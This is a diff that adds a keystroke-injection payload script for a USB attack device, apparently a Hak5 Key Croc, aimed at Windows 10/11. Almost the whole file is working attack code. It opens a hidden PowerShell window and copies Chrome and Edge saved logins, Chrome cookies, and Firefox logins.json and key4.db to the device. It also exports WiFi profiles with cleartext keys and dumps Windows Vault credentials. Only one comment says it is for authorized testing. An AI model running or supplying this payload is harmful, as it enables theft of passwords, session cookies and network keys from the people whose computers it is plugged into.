@@ -1,0 +1,83 @@
+#!/bin/bash
+# Title: Browser Credential Exfiltration
+# Author: David Osisek (CamoZeroDay)
+# Target: Windows 10/11
+# Version: 1.0
+# Category: Credential Access
+# 
+# ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY
+# Extracts Chrome, Firefox, Edge credentials
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+
+LED STAGE1
+Q DELAY 2000
+
+# Open PowerShell as Admin
+LED STAGE2
+Q GUI r
+Q DELAY 500
+Q STRING powershell -WindowStyle Hidden -NoProfile
+Q ENTER
+Q DELAY 2000
+
+# Chrome Credentials
+LED STAGE3
+Q STRING \$chrome='\$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data'
+Q ENTER
+Q STRING \$dest=(Get-Volume | Where-Object {\$_.DriveType -eq 'Removable' -and \$_.FileSystemLabel -eq 'KEYCROC'}).DriveLetter
+Q ENTER
+Q DELAY 500
+
+Q STRING if(Test-Path \$chrome){Copy-Item \$chrome "\${dest}:\\chrome_login.db"}
+Q ENTER
+Q DELAY 2000
+
+# Chrome Cookies
+Q STRING \$cookies='\$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies'
+Q ENTER
+Q STRING if(Test-Path \$cookies){Copy-Item \$cookies "\${dest}:\\chrome_cookies.db"}
+Q ENTER
+Q DELAY 2000
+
+# Firefox Credentials
+Q STRING \$firefox=Get-ChildItem "\$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json" -ErrorAction SilentlyContinue
+Q ENTER
+Q STRING if(\$firefox){Copy-Item \$firefox.FullName "\${dest}:\\firefox_logins.json"}
+Q ENTER
+Q DELAY 2000
+
+# Firefox Key Database
+Q STRING \$ffkey=Get-ChildItem "\$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\key4.db" -ErrorAction SilentlyContinue
+Q ENTER
+Q STRING if(\$ffkey){Copy-Item \$ffkey.FullName "\${dest}:\\firefox_key4.db"}
+Q ENTER
+Q DELAY 2000
+
+# Edge Credentials
+Q STRING \$edge='\$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data'
+Q ENTER
+Q STRING if(Test-Path \$edge){Copy-Item \$edge "\${dest}:\\edge_login.db"}
+Q ENTER
+Q DELAY 2000
+
+# WiFi Passwords
+Q STRING netsh wlan export profile key=clear folder="\${dest}:\\wifi\\"
+Q ENTER
+Q DELAY 2000
+
+# Windows Vault
+Q STRING vaultcmd /listcreds:'Windows Credentials' /all > "\${dest}:\\vault.txt"
+Q ENTER
+Q DELAY 1000
+
+# Exit
+Q STRING exit
+Q ENTER
+
+LED FINISH
+Q DELAY 2000
+
+sync
